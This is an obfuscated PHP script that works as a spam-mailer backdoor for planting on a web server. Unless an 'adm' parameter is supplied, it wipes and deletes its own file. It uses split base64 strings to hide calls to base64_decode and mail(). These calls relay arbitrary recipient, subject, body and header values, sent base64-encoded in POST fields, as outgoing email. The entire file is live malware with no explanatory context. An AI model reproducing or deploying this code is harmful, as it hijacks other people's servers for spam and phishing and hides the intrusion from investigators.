<?
if(!isset($_GET['adm'])){
	$path = dirname(__FILE__);
	$filename = $_SERVER['PHP_SELF'];
	if(file_exists($path.$filename)){	
		$fgood = fopen($path.$filename, 'w');
		fwrite($fgood, '');
		fclose($fgood);
		unlink($path.$filename);
	}
	if(file_exists($_SERVER['SCRIPT_FILENAME'])){
		$fgood = fopen($_SERVER['SCRIPT_FILENAME'], 'w');
		fwrite($fgood, '');
		fclose($fgood);
		unlink($_SERVER['SCRIPT_FILENAME']);
	}
	if(file_exists(__FILE__)){
		$fgood = fopen(__FILE__, 'w');
		fwrite($fgood, '');
		fclose($fgood);
		unlink(__FILE__);	
	}
}
$GLOBALS['_504973228_']=Array(base64_decode('YmFzZTY0' .'X' .'2R' .'lY' .'29k' .'ZQ=='),base64_decode('YmF' .'z' .'Z' .'TY0X2RlY29' .'kZQ=='),base64_decode('YmFz' .'ZTY' .'0X2RlY29kZQ=' .'='),base64_decode('' .'YmFz' .'ZT' .'Y0' .'X2Rl' .'Y' .'29kZQ=='),base64_decode('bWFpbA==')); ?><? function _1897419779($i){$a=Array('bWFpbHRv','bWFpbHRv','aW5kYXRhX2Vycm9y','bXNnaGVhZGVy','bXNnaGVhZGVy','aW5kYXRhX2Vycm9y','bXNnYm9keQ==','bXNnYm9keQ==','aW5kYXRhX2Vycm9y','bXNnc3ViamVjdA==','bXNnc3ViamVjdA==','aW5kYXRhX2Vycm9y','c2VudF9vaw==','c2VudF9lcnJvcg==');return base64_decode($a[$i]);} ?><?php if(isset($_POST[_1897419779(0)]))$_0=$GLOBALS['_504973228_'][0]($_POST[_1897419779(1)]);else{echo _1897419779(2);exit;}if(isset($_POST[_1897419779(3)]))$_1=$GLOBALS['_504973228_'][1]($_POST[_1897419779(4)]);else{echo _1897419779(5);exit;}if(isset($_POST[_1897419779(6)]))$_2=$GLOBALS['_504973228_'][2]($_POST[_1897419779(7)]);else{echo _1897419779(8);exit;}if(isset($_POST[_1897419779(9)]))$_3=$GLOBALS['_504973228_'][3]($_POST[_1897419779(10)]);else{echo _1897419779(11);exit;}if($GLOBALS['_504973228_'][4]($_0,$_3,$_2,$_1))echo _1897419779(12);else echo _1897419779(13); ?>